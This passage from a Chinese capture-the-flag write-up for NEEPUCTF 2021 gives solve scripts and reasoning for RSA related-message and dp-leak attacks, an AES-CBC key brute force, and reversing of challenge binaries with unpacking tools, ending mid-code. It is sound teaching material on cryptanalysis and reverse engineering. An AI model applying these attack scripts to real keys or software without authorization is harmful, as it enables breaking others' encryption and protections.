class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671&#x27;</span></span><br><span class="line"><span class="string">&#x27;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543&#x27;</span></span><br><span class="line"><span class="string">&#x27;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892&#x27;</span></span><br><span class="line"><span class="string">&#x27;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>两部分：</p><p>第一部分 $n=pq,c=\text{flag}^e \bmod n$，</p><p>第二部分 $m=\text{enc}(p,q,e),c_1=m^7 \bmod n,c_2=(m+e)^7 \bmod n$。</p><p>先解第二部分，利用Related Message Attack求解 $m$，由于 $e$ 未知且 $e&lt;1010$，爆破 $e$ 求出 $m$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">c1, c2, n, e</span>):</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (x)^<span class="number">7</span> - c1</span><br><span class="line">    g2 = (x+e)^<span class="number">7</span> - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">c1 = <span class="number">10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892</span></span><br><span class="line">c2 = <span class="number">46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119</span></span><br><span class="line">n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    m = attack(c1, c2, n, e)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(m,<span class="number">7</span>,n) == c1:</span><br><span class="line">            <span class="built_in">print</span>((e,m))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#结果：(71, 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859)</span></span><br><span class="line"><span class="comment">#e = 71</span></span><br><span class="line"><span class="comment">#m = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859</span></span><br></pre></td></tr></table></figure><p>又 $m=\text{enc}(p,q,e)$，即 $eS=ed \equiv 1 \pmod {(p+1)(q+1)},dp=S \bmod (p+1)=d \bmod (p+1)$，</p><p>由于 $e \cdot dp \equiv e \cdot d \equiv 1 \pmod {(p+1)}$，有 $e \cdot dp-1=k \cdot (p+1)$，</p><p>比较 $e \cdot dp$ 与 $p$ 比特位数相近，故 $k$ 值不大，</p><p>爆破 $k$，当同时满足 $(e \cdot dp-1) \bmod k =0$ 和 $n \bmod \Big(\cfrac{e \cdot dp-1}{k}-1\Big)$ 时，$n$ 成功分解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line">dp = <span class="number">129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859</span></span><br><span class="line">e = <span class="number">71</span></span><br><span class="line">c = <span class="number">78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> (e*dp-<span class="number">1</span>)%k == <span class="number">0</span>:</span><br><span class="line">        p = (e*dp-<span class="number">1</span>)//k-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            q = n//p</span><br><span class="line">            <span class="built_in">print</span>((k,p,q))</span><br></pre></td></tr></table></figure><p>最后常规RSA求得flag。</p><p>​    </p><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><blockquote><p>简单的AES</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = os.urandom(<span class="number">18</span>)</span><br><span class="line">flag_enc = os.urandom(<span class="number">45</span>)</span><br><span class="line">pad = <span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span> + <span class="string">b&#x27;Neepu&#123;&#x27;</span></span><br><span class="line">flag_enc = pad+flag_enc+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">masg1 = flag_enc[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">masg2 = flag_enc[<span class="number">32</span>: ]</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(masg1)^bytes_to_long(masg2)</span><br><span class="line">key = os.urandom(<span class="number">2</span>)*<span class="number">16</span></span><br><span class="line">iv = masg2[<span class="number">16</span>:][:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(key)^bytes_to_long(iv))</span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">enc_flag = aes.encrypt(long_to_bytes(m))</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line"><span class="string">b&#x27;\xd8\x83\xfd\x89\xc3+\x11\xb8g\xd2\xf5k\xeeU\x88\xb5\xde\x8bq\x9bC\xab\xe3K2R&lt;\xaa\xbc\x92H\x19&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>先看<code>flag_enc</code>由64字符构成，已知前18字符 <code>aaaaaaaaaaaaNeepu&#123;</code> 和后1字符 <code>&#125;</code> 。</p><p>拆半分别为前32字符 <code>masg1</code> 和后32字符 <code>masg2</code>，异或值 <code>m = masg1^masg2</code>，</p><p>通过AES-CBC加密，key形如 <code>xyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxy</code>，iv为 <code>masg2</code> 后16字符，已知 <code>key^iv</code>。</p><p>从key入手，key只有两位未知，爆破key值，同时得到iv值，利用<strong>iv值16位</strong>和最后1位字符为<code>&#125;</code>，得到key和iv值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tmp=<span class="number">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">key = <span class="built_in">bytes</span>([i,j])*<span class="number">16</span></span><br><span class="line">iv = long_to_bytes(tmp^bytes_to_long(key))</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(iv) == <span class="number">16</span> <span class="keyword">and</span> iv[-<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#iv: b&#x27;fefcsukobhmtfhb&#125;&#x27;</span></span><br><span class="line"><span class="comment">#key: b&#x27;\xf5\x91&#x27;*16</span></span><br></pre></td></tr></table></figure><p>由key和iv值+密文 <code>enc</code> 解出 <code>m</code>。</p><p>此时，前32字符 <code>masg1</code> 已知前16字符<code>aaaaaaaaaaaaNeep</code>，后32字符 <code>masg2</code> 已知后16字符 <code>fefcsukobhmtfhb&#125;</code>，根据 <code>m = masg1^masg2</code> 分别异或得到另一半：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iv = <span class="string">b&#x27;fefcsukobhmtfhb&#125;&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xf5\x91&#x27;</span>*<span class="number">16</span></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">m = aes.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">masg1 = (<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">b&#x27;Neep&#x27;</span>) + long_to_bytes(bytes_to_long(iv)^bytes_to_long(m[<span class="number">16</span>:]))</span><br><span class="line">masg2 = long_to_bytes(bytes_to_long(<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+<span class="string">b&#x27;Neep&#x27;</span>)^bytes_to_long(m[:<span class="number">16</span>])) + iv</span><br><span class="line">flag_enc = masg1 + masg2</span><br><span class="line"></span><br><span class="line"><span class="comment">#aaaaaaaaaaaaNeepu&#123;qszeftwdr-thuilpyji-ijlmukoescfefcsukobhmtfhb&#125;</span></span><br></pre></td></tr></table></figure><p>发现代码里 <code>flag</code> 和 <code>flag_enc</code> 无直接关联，观察 <code>flag_enc</code>为键盘加密，解密得 <code>flag</code>：<code>Neepu&#123;are-you-kidding&#125;</code>。  </p><p>​    </p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="OLLEH"><a href="#OLLEH" class="headerlink" title="OLLEH"></a>OLLEH</h3><blockquote><p>!ni ngis ER laeR</p><p>hint: 师傅们如果做出来了请将flag框架改为Neepu{}，给师傅们带来不便，非常抱歉</p></blockquote><p>IDA，<code>main()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_main();</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="keyword">char</span> *)v20, <span class="string">&quot;416:99A:77&quot;</span>);       <span class="comment">//字符串v20 = 416:99A:77</span></span><br><span class="line">v20[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">LOBYTE(v20[<span class="number">7</span>]) = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">v14[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">v14[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">2</span>; i &lt;= <span class="number">19</span>; ++i )               <span class="comment">//v14 = 长度20的斐波那契数列</span></span><br><span class="line">  v14[i] = v14[i - <span class="number">2</span>] + v14[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )                <span class="comment">//v20按 (斐波那契数列值 &amp; 0xF) 移位，存入v4 = 3047414550</span></span><br><span class="line">  *(&amp;v4 + i) = *((<span class="keyword">char</span> *)v20 + i) - (v14[i] &amp; <span class="number">0xF</span>);</span><br><span class="line">v17[<span class="number">0</span>] = <span class="string">&#x27;OLLEH&#x27;</span>;                         <span class="comment">//v17 = HELLO</span></span><br><span class="line">v17[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">v18 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(v15, <span class="string">&quot;flag&#123;world_Vjea&#125;&quot;</span>);          <span class="comment">//v15 = flag&#123;world_Vjea&#125;</span></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">  v16[j] = *((_BYTE *)v17 + j);           <span class="comment">//v16[0:5] = v17[0:5] = HELLO</span></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">5</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">  v16[j] = v15[j];                        <span class="comment">//v16[5:10] = v15[5:10] = world</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Welcome to the 2021 NEEPUCTF&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now you can enjoy it&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please input right number:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">v21 = <span class="built_in">strlen</span>(Str);</span><br><span class="line"><span class="keyword">if</span> ( v21 != <span class="number">10</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v4 == Str[<span class="number">0</span>]</span><br><span class="line">  &amp;&amp; v5 == Str[<span class="number">1</span>]</span><br><span class="line">  &amp;&amp; v6 == Str[<span class="number">2</span>]</span><br><span class="line">  &amp;&amp; v7 == Str[<span class="number">3</span>]</span><br><span class="line">  &amp;&amp; v8 == Str[<span class="number">4</span>]</span><br><span class="line">  &amp;&amp; v9 == Str[<span class="number">5</span>]</span><br><span class="line">  &amp;&amp; v10 == Str[<span class="number">6</span>]</span><br><span class="line">  &amp;&amp; v11 == Str[<span class="number">7</span>]</span><br><span class="line">  &amp;&amp; v12 == Str[<span class="number">8</span>]</span><br><span class="line">  &amp;&amp; v13 == Str[<span class="number">9</span>] )                       <span class="comment">//Str == v4</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;OK,FLAG is  NEEPU&#123;MD5&#123;%s%d%d%d%d%d&#125;&#125;&quot;</span>, v16, v4, v5, v6, v7, v8);</span><br><span class="line">  getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;byebye&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>按代码逻辑，拼接得 <code>v16 = HeLLOworld</code>，<code>v4~v8 = 30474</code>，由于 <code>v4~v8</code> 格式化输出为 <code>%d</code>，转化为对应ASCII值。</p><p>flag得到：<code>Neepu&#123;md5(HeLLOworldworld5148525552)&#125;</code></p><p>​    </p><h3 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h3><blockquote><p>ezRE, wryyyyy~</p></blockquote><p>两个文件，easyre.dll 和 easyre.exe。</p><p>exeinfope查看easyre.dll，发现是.NET程序，上ILSpy：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// retest.Program</span></span><br><span class="line">internal <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string text = <span class="string">&quot;mT0b&quot;</span>;</span><br><span class="line">string text2 = <span class="string">&quot;D&#123;0S&quot;</span>;</span><br><span class="line">string text3 = <span class="string">&quot;Dg9E&quot;</span>;</span><br><span class="line">string text4 = <span class="string">&quot;OD_&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>[] array = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">char</span>[] array2 = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">char</span>[] array3 = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">char</span>[] array4 = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line">array[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">array[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">array[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">array[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">array2[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">array2[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">array2[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">array2[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">array3[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array3[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array3[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array3[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array4[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array4[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array4[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array4[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">Encrypt1</span>(array);</span><br><span class="line"><span class="built_in">Encrypt1</span>(array2);</span><br><span class="line"><span class="built_in">Encrypt1</span>(array3);</span><br><span class="line"><span class="built_in">Encrypt1</span>(array4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Encrypt1</span><span class="params">(<span class="keyword">char</span>[] string1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num = string1.Length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">string1[i] = (<span class="keyword">char</span>)(string1[i] - <span class="number">31</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">string1[i] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">string1[i] = (<span class="keyword">char</span>)(string1[i] + <span class="number">33</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">string1[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (string1[i] == <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">string1[i] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">string1[i] = (<span class="keyword">char</span>)(string1[i] + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看Main()，按逻辑得 <code>array1~4</code> 分别为 <code>mDDO,T&#123;gD,009_,bSE&#125;</code>，再看Encrypt1()，<code>a-z</code>移位-31，<code>A-Z</code>移位33，<code>0-9</code> 移位1，操作后得 <code>Neepu&#123;He110_Ctf&#125;</code>。</p><p>​    </p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><blockquote><p>login in please :)</p></blockquote><p>login文件夹里包含usrs_info2.pickle序列化文件，确定是python程序。</p><p>pyinstxtractor解包exe为pyc，再uncompyle6反编译<code>retest2.pyc</code>为python源码，找到flag。</p><p>​    </p><h3 id="ppap"><a href="#ppap" class="headerlink" title="ppap"></a>ppap</h3><blockquote><p>最近小猫爱上了闯关</p></blockquote><p>查壳发现upx壳，工具脱壳。</p><p>IDA，<code>main()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  sub_40DA40();</span><br><span class="line">LABEL_2:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ppap&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The cat is very cute, do you like it?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;My cat is lost, help me&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your cat&#x27;s name&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me 1+2=?&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%256s\n&quot;</span>, Str);                        <span class="comment">//输入字符串</span></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  v11 = (<span class="keyword">const</span> <span class="keyword">char</span> 